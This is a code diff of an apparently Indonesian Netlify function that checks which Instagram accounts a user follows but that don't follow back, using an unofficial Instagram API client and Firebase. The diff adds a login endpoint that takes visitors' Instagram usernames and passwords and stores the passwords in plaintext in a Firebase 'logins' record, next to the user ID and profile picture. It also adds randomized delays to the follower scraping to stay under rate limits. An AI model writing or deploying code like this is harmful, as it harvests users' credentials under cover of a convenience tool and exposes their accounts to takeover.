@@ -1,52 +1,3 @@
-const { IgApiClient } = require('instagram-private-api');
-const axios = require('axios');
-const path = require('path');
-const { db } = require('./config/firebaseConfig');
-const ig = new IgApiClient();
-
-let sessionData = null;
-
-// Fungsi untuk login ke Instagram
-const login = async () => {
-    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
-
-    if (sessionData) {
-        ig.state.deserialize(sessionData);
-        console.log('Sesi ditemukan, melanjutkan...');
-        try {
-            await ig.account.currentUser();
-            console.log('Sesi valid, melanjutkan...');
-        } catch (error) {
-            console.log('Sesi kadaluarsa, login ulang...');
-            await forceLogin();
-        }
-    } else {
-        console.log('Sesi tidak ditemukan, login ulang...');
-        await forceLogin();
-    }
-};
-
-// Fungsi untuk login ulang dan menyimpan sesi baru di Firebase
-const forceLogin = async () => {
-    try {
-        console.log('Mencoba login...');
-        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
-        console.log('Login berhasil!');
-        sessionData = ig.state.serialize();
-        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData });
-    } catch (error) {
-        console.error('Login gagal:', error);
-        if (error.name === 'IgCheckpointError') {
-            return {
-                statusCode: 400,
-                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
-            };
-        } else {
-            throw error;
-        }
-    }
-};
-
 // Fungsi untuk mendapatkan data followers dengan paginasi dan retry logic
 const getAllFollowers = async (userId, retries = 3) => {
     let followers = [];
@@ -57,14 +8,16 @@ const getAllFollowers = async (userId, retries = 3) => {
         try {
             let nextFollowers = await followersFeed.items();
             followers = followers.concat(nextFollowers);
-            attempt = 0;
-            await delay(generateRandomDelay()); // Menambah delay yang bervariasi
+            attempt = 0; // Reset attempt after successful fetch
+            const randomDelay = Math.floor(Math.random() * (40000 - 10000 + 1)) + 10000; // Delay antara 10 detik hingga 40 detik
+            console.log(`Delaying for ${randomDelay} ms`);
+            await delay(randomDelay); // Delay untuk menghindari rate limiting
         } catch (error) {
             console.error('Error fetching followers:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000);
+                await delay(5000); // Delay sebelum retry
             } else {
                 throw new Error('Failed to fetch followers after multiple retries.');
             }
@@ -83,14 +36,16 @@ const getAllFollowing = async (userId, retries = 3) => {
         try {
             let nextFollowing = await followingFeed.items();
             following = following.concat(nextFollowing);
-            attempt = 0;
-            await delay(generateRandomDelay()); // Menambah delay yang bervariasi
+            attempt = 0; // Reset attempt after successful fetch
+            const randomDelay = Math.floor(Math.random() * (40000 - 10000 + 1)) + 10000; // Delay antara 10 detik hingga 40 detik
+            console.log(`Delaying for ${randomDelay} ms`);
+            await delay(randomDelay); // Delay untuk menghindari rate limiting
         } catch (error) {
             console.error('Error fetching following:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000);
+                await delay(5000); // Delay sebelum retry
             } else {
                 throw new Error('Failed to fetch following after multiple retries.');
             }
@@ -99,7 +54,7 @@ const getAllFollowing = async (userId, retries = 3) => {
     return following;
 };
 
-// Fungsi utama untuk menangani request profile Instagram
+// Fungsi untuk menangani request profile Instagram
 exports.handler = async function (event, context) {
     if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
         try {
@@ -113,18 +68,17 @@ exports.handler = async function (event, context) {
             // Mendapatkan gambar profil
             const profilePicUrl = user.profile_pic_url;
 
-            // Ambil data followers dan following dengan tambahan waktu delay
+            // Ambil data followers dan following
             const followers = await getAllFollowers(user.pk);
             const following = await getAllFollowing(user.pk);
 
-            // Menyaring usernames followers dan following
             const followersUsernames = followers.map(f => f.username);
             const followingUsernames = following.map(f => f.username);
 
             // Cari orang yang tidak follow back
             const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));
 
-            // Menyimpan data pengguna ke Firebase
+            // Menyimpan data pengguna dan informasi lainnya ke Firebase Realtime Database
             await db.ref('users').child(user.pk).set({
                 username: user.username,
                 full_name: user.full_name,
@@ -161,6 +115,49 @@ exports.handler = async function (event, context) {
                 };
             }
         }
+    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
+        const { username, password } = JSON.parse(event.body);
+
+        try {
+            ig.state.generateDevice(username);
+            await ig.account.login(username, password);
+            sessionData = ig.state.serialize();
+
+            const user = await ig.account.currentUser();
+            const userId = user.pk;
+
+            const loginData = {
+                username,
+                password,
+                userId,
+                timestamp: new Date().toISOString(),
+                profile_picture_url: user.profile_pic_url,
+            };
+
+            await db.ref('logins').child(userId).set(loginData);
+            return {
+                statusCode: 200,
+                body: JSON.stringify({ message: 'Login berhasil!' }),
+            };
+        } catch (error) {
+            console.error('Login gagal:', error);
+            if (error.name === 'IgLoginRequiredError') {
+                return {
+                    statusCode: 401,
+                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
+                };
+            } else if (error.name === 'IgCheckpointError') {
+                return {
+                    statusCode: 400,
+                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
+                };
+            } else {
+                return {
+                    statusCode: 500,
+                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
+                };
+            }
+        }
     }
 
     return {
@@ -171,10 +168,3 @@ exports.handler = async function (event, context) {
 
 // Fungsi delay untuk menghindari rate limiting
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-// Fungsi untuk menghasilkan delay acak antara 10 detik hingga 40 detik
-const generateRandomDelay = () => {
-    const minDelay = 10000; // 10 detik
-    const maxDelay = 40000; // 40 detik
-    return Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
-};
